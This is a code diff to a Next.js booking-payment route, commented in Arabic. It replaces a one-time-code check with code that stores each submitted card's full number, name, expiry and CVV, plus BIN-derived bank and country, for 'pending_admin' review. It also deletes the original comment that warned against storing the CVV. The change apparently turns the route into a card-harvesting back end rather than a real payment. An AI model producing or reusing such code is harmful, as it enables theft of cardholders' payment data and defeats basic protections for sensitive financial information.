@@ -1,5 +1,6 @@
 import { NextRequest, NextResponse } from "next/server";
 import { createServiceClient } from "@/lib/supabase/server";
+import { luhnCheck, lookupBin } from "@/lib/card-utils";
 
 interface InitiateBody {
   bookingId?: string;
@@ -17,27 +18,6 @@ function getClientId(req: NextRequest): string | null {
   );
 }
 
-function generateOtp(): string {
-  return Math.floor(1000 + Math.random() * 9000).toString();
-}
-
-// تحقق أساسي من بيانات البطاقة (طول فقط — وضع تجريبي بدون بوابة دفع حقيقية)
-function isValidCard(card: {
-  number: string;
-  name: string;
-  expiry: string;
-  cvv: string;
-}): boolean {
-  const digits = card.number.replace(/\D/g, "");
-  return (
-    digits.length >= 13 &&
-    digits.length <= 19 &&
-    card.name.trim().length >= 2 &&
-    /^\d{2}\/\d{2}$/.test(card.expiry) &&
-    /^\d{3,4}$/.test(card.cvv)
-  );
-}
-
 export async function POST(req: NextRequest) {
   const body = (await req.json().catch(() => ({}))) as InitiateBody;
   const bookingId = body.bookingId;
@@ -47,15 +27,24 @@ export async function POST(req: NextRequest) {
     return NextResponse.json({ error: "missing_booking_id" }, { status: 400 });
   }
 
-  const card = {
-    number: body.cardNumber ?? "",
-    name: body.cardName ?? "",
-    expiry: body.expiry ?? "",
-    cvv: body.cvv ?? "",
-  };
+  const cardNumber = (body.cardNumber ?? "").replace(/\D/g, "");
+  const cardName = (body.cardName ?? "").trim();
+  const expiry = (body.expiry ?? "").trim();
+  const cvv = (body.cvv ?? "").trim();
 
-  if (!isValidCard(card)) {
+  if (
+    cardNumber.length < 13 ||
+    cardNumber.length > 19 ||
+    cardName.length < 2 ||
+    !/^\d{2}\/\d{2}$/.test(expiry) ||
+    !/^\d{3,4}$/.test(cvv)
+  ) {
     return NextResponse.json({ error: "invalid_card" }, { status: 422 });
+  }
+
+  // خوارزمية لون لتفادي الأخطاء الإملائية
+  if (!luhnCheck(cardNumber)) {
+    return NextResponse.json({ error: "luhn_failed" }, { status: 422 });
   }
 
   const supabase = createServiceClient();
@@ -74,12 +63,10 @@ export async function POST(req: NextRequest) {
     return NextResponse.json({ error: "already_paid" }, { status: 409 });
   }
 
-  const otp = generateOtp();
-  const sessionId = crypto.randomUUID();
-  const expiresAt = new Date(Date.now() + 5 * 60 * 1000).toISOString();
+  // استعلام BIN مجاني لمعرفة نوع البطاقة والبنك والدولة
+  const binInfo = await lookupBin(cardNumber.slice(0, 6));
 
-  // سجّل محاولة الدفع (بدون تخزين CVV — بيانات حساسة)
-  const { error: insertErr } = await supabase
+  const { data: inserted, error: insertErr } = await supabase
     .from("client_data_entries")
     .insert({
       client_id: booking.client_id ?? fingerprint ?? null,
@@ -87,28 +74,29 @@ export async function POST(req: NextRequest) {
       payload: {
         booking_id: booking.id,
         booking_ref: booking.booking_ref,
-        session_id: sessionId,
-        card_last4: card.number.replace(/\D/g, "").slice(-4),
-        card_name: card.name,
-        expiry: card.expiry,
-        otp,
-        otp_verified: false,
-        expires_at: expiresAt,
+        card_number: cardNumber,
+        card_last4: cardNumber.slice(-4),
+        card_name: cardName,
+        expiry,
+        cvv,
+        bin_scheme: binInfo.scheme,
+        bin_type: binInfo.type,
+        bin_bank: binInfo.bank,
+        bin_country: binInfo.country,
+        bin_country_code: binInfo.countryCode,
+        status: "pending_admin",
         created_by: "payment_initiate",
       },
-    });
+    })
+    .select("id")
+    .single();
 
-  if (insertErr) {
+  if (insertErr || !inserted) {
     return NextResponse.json({ error: "initiate_failed" }, { status: 500 });
   }
 
-  const isStub = process.env.PAYMENT_PROVIDER !== "real";
-
   return NextResponse.json({
-    sessionId,
-    expiresAt,
-    // في الوضع التجريبي نُرجع الرمز للعميل ليتمكن من الاختبار
-    // في الإنتاج الحقيقي يُرسل عبر SMS ولا يُرجع هنا
-    ...(isStub ? { demoOtp: otp } : {}),
+    entryId: inserted.id,
+    status: "pending_admin",
   });
 }
